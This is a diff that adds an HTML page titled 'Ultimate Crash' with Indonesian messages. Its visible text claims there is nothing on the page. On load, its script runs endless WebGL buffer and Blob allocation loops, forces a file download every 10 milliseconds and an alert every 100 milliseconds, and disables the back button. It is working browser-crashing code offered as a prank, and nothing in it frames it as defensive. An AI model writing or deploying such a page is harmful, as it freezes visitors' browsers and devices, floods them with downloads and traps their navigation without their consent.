@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ultimate Crash</title>
+    <meta name="theme-color" content="#000000">
+    <link rel="manifest" href="manifest.json">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+
+
+    <script>
+        window.onload = function() {
+            try {
+                let canvas = document.createElement("canvas");
+                document.body.appendChild(canvas);
+                let gl = canvas.getContext("webgl");
+
+                if (!gl) {
+                    alert("tunggu sebentar.");
+                    return;
+                }
+
+                while (true) {
+                    let buffer = gl.createBuffer();
+                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(1e7), gl.STATIC_DRAW);
+                }
+            } catch (e) {
+                console.log("WebGL crash gagal:", e);
+            }
+
+            try {
+                let blobs = [];
+                while (true) {
+                    let blob = new Blob(["A".repeat(50)], {
+                        type: "text/plain"
+                    });
+                    blobs.push(blob);
+                }
+            } catch (e) {
+                console.log("Memory Leak gagal:", e);
+            }
+
+            try {
+                setInterval(() => {
+                    let a = document.createElement("a");
+                    a.href = "data:text/plain," + "A".repeat(50);
+                    a.download = "crash.txt";
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                }, 10);
+            } catch (e) {
+                console.log("Download Bomb gagal:", e);
+            }
+
+            try {
+                setInterval(() => {
+                    alert("sabar ya");
+                }, 100);
+            } catch (e) {
+                console.log("Popup Bomb seru,silahkan tunggu:", e);
+            }
+        };
+    </script>
+</head>
+
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+    <h1 style="font-size: 2rem; text-align: center; justify-content: center;">Ga ada apa apa kok..</h1>
+    <script>
+        document.addEventListener("touchmove", function(event) {
+            if (event.touches.length > 1) {
+                event.preventDefault();
+            }
+        }, {
+            passive: false
+        });
+        history.pushState(null, null, location.href);
+        window.onpopstate = function() {
+            history.go(1);
+        };
+        document.getElementById("hobbyForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            for (let i = 0; i < 50; i++) {
+                let confetti = document.createElement("div");
+                confetti.className = "confetti";
+                confetti.style.left = Math.random() * 100 + "vw";
+                confetti.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                document.body.appendChild(confetti);
+                setTimeout(() => confetti.remove(), 2000);
+            }
+        });
+    </script>
+</body>
+
+</html>
